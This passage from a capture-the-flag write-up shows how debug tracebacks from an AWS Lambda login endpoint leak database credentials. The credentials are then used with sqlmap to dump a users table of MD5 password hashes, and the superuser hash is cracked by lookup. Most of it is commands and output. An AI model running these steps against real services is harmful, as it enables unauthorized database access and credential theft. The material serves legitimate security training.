	return false;
}
```
Let's try different inputs:
```console
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website# curl -s "https://nk932uo6zj.execute-api.eu-central-1.amazonaws.com/default/CyberTankAuthLambda?action=login&username=#"
File /var/task/lambda_function.py, line 70, in lambda_handler
    60   def lambda_handler(event, context):
 (...)
    66
    67                  if query['action'] == "forgot":
    68                          return ret(forgot(query['username']))
    69                  elif query['action'] == "login":
--> 70                          return ret(login(query['username'], query['password']))
    71                  else:
    ..................................................
     event = {'version': 2,
              'path': '/default/CyberTankAuthLambda',
              'httpMethod': 'GET',
              'headers': {'Content-Length': '0',
                          'Host': 'nk932uo6zj.execute-api.eu-central-1.am
              azonaws.com',
                          'User-Agent': 'curl/7.64.0',
                          'X-Amzn-Trace-Id': 'Root=1-5e32050d-39ec62fca49
              a453079fe93dc',
                          'X-Forwarded-For': '77.124.115.11',
                          'X-Forwarded-Port': '443',
                          'X-Forwarded-Proto': 'https',
                          'accept': '*/*'},
              'multiValueHeaders': {'Content...
     context = 
     query = {'action': 'login',
              'username': ''}
    ..................................................
KeyError: 'password'
```
A debug message is displayed upon error. We can see that there's also a "forgot your password" action, let's try it:
```console
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website# curl -s "https://nk932uo6zj.execute-api.eu-central-1.amazonaws.com/default/CyberTankAuthLambda?action=forgot&username=#"
File /var/task/lambda_function.py, line 68, in lambda_handler
    60   def lambda_handler(event, context):
 (...)
    64                  query = event["queryStringParameters"]
    65                  conn = pymysql.connect(rds_config.db_host, user=rds_config.db_user, passwd=rds_config.db_pass, db=rds_config.db_name, connect_timeout=5, cursorclass=pymysql.cursors.DictCursor)
    66
    67                  if query['action'] == "forgot":
--> 68                          return ret(forgot(query['username']))
    69                  elif query['action'] == "login":
    ..................................................
     event = {'version': 2,
              'path': '/default/CyberTankAuthLambda',
              'httpMethod': 'GET',
              'headers': {'Content-Length': '0',
                          'Host': 'nk932uo6zj.execute-api.eu-central-1.am
              azonaws.com',
                          'User-Agent': 'curl/7.64.0',
                          'X-Amzn-Trace-Id': 'Root=1-5e320542-cb1c072c9e6
              45c8249e569a6',
                          'X-Forwarded-For': '77.124.115.11',
                          'X-Forwarded-Port': '443',
                          'X-Forwarded-Proto': 'https',
                          'accept': '*/*'},
              'multiValueHeaders': {'Content...
     context = 
     query = {'action': 'forgot',
              'username': ''}
     conn = 
     pymysql.connect = 
     rds_config.db_host = 'database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazon
                           aws.com'
     rds_config.db_user = 'cyber_ro'
     rds_config.db_pass = 'CTF{6d4efb805865d7fcc6fec9da232044a7w}'
     rds_config.db_name = 'cybertank'
     pymysql.cursors.DictCursor = 
    ..................................................
File /var/task/lambda_function.py, line 36, in forgot
    32   def forgot(username):
    33          global conn
    34
    35          if not username.isalnum():
--> 36                  raise Exception("Username validation failed.")
    37
    ..................................................
     username = ''
     conn = 
    ..................................................
Exception: Username validation failed.
```
The DB password is leaked as part of the debug information.
## Superuser (75 points)
> The superuser account can access everything. Can you find out the account's password and tell the CyberTank executives whether it's secure? 
> 
> Flag format: password
We already have the credentials and server details, just need to connect:
```console
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website# sqlmap -d "mysql://cyber_ro:CTF{6d4efb805865d7fcc6fec9da232044a7w}@database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com:3306/cybertank" --tables
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting at 19:34:50
[19:34:51] [INFO] connection to mysql server database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com:3306 established
[19:34:51] [INFO] testing MySQL
[19:34:51] [INFO] resumed: [[u'1']]...
[19:34:51] [INFO] confirming MySQL
[19:34:51] [INFO] resumed: [[u'1']]...
[19:34:51] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[19:34:51] [INFO] fetching database names
[19:34:52] [INFO] fetching tables for databases: 'cybertank, information_schema'
Database: information_schema
[77 tables]
+---------------------------------------+
| ALL_PLUGINS                           |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| CLIENT_STATISTICS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GEOMETRY_COLUMNS                      |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INDEX_STATISTICS                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_METRICS                        |
| INNODB_MUTEXES                        |
| INNODB_SYS_COLUMNS                    |
| INNODB_SYS_DATAFILES                  |
| INNODB_SYS_FIELDS                     |
| INNODB_SYS_FOREIGN                    |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_SYS_INDEXES                    |
| INNODB_SYS_SEMAPHORE_WAITS            |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_TABLESPACES                |
| INNODB_SYS_TABLESTATS                 |
| INNODB_SYS_VIRTUAL                    |
| INNODB_TABLESPACES_ENCRYPTION         |
| INNODB_TABLESPACES_SCRUBBING          |
| INNODB_TRX                            |
| KEY_CACHES                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| RDS_EVENTS_THREADS_WAITS_CURRENT      |
| RDS_PROCESSLIST                       |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| SPATIAL_REF_SYS                       |
| STATISTICS                            |
| SYSTEM_VARIABLES                      |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TABLE_STATISTICS                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| USER_STATISTICS                       |
| VIEWS                                 |
| user_variables                        |
+---------------------------------------+
Database: cybertank
[1 table]
+---------------------------------------+
| users                                 |
+---------------------------------------+
[19:34:52] [INFO] connection to mysql server database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com:3306 closed
[*] shutting down at 19:34:52
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website# sqlmap -d "mysql://cyber_ro:CTF{6d4efb805865d7fcc6fec9da232044a7w}@database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com:3306/cybertank" --dump -T users
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.5#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting at 19:35:20
[19:35:20] [INFO] connection to mysql server database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com:3306 established
[19:35:20] [INFO] testing MySQL
[19:35:20] [INFO] resumed: [[u'1']]...
[19:35:20] [INFO] confirming MySQL
[19:35:20] [INFO] resumed: [[u'1']]...
[19:35:21] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[19:35:21] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[19:35:21] [INFO] fetching current database
[19:35:21] [INFO] fetching columns for table 'users' in database 'cybertank'
[19:35:21] [INFO] fetching entries for table 'users' in database 'cybertank'
[19:35:21] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: cybertank
Table: users
[3 entries]
+----+-----------+----------------------------------+--------------+
| id | username  | password                         | access_level |
+----+-----------+----------------------------------+--------------+
| 1  | superuser | 79839a6b78cf257a31d976cd8a381760 | 1            |
| 2  | admin     | 21232f297a57a5a743894a0e4a801fc3 | 2            |
| 3  | guest     | 084e0343a0486ff05530df6c705c8bb4 | 5            |
+----+-----------+----------------------------------+--------------+
[19:35:32] [INFO] table 'cybertank.users' dumped to CSV file '/root/.sqlmap/output/database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com/dump/cybertank/users.csv'
[19:35:32] [INFO] connection to mysql server database-cybertank-tst.cj6jw4xocthe.eu-central-1.rds.amazonaws.com:3306 closed
[*] shutting down at 19:35:32
```
If we search Google for the superuser's password hash, we find that it's the MD5 of `cybertrix`:
```console
root@kali:/media/sf_CTFs/hackazon/CyberTank_Website# echo -n cybertrix | md5sum
79839a6b78cf257a31d976cd8a381760  -
```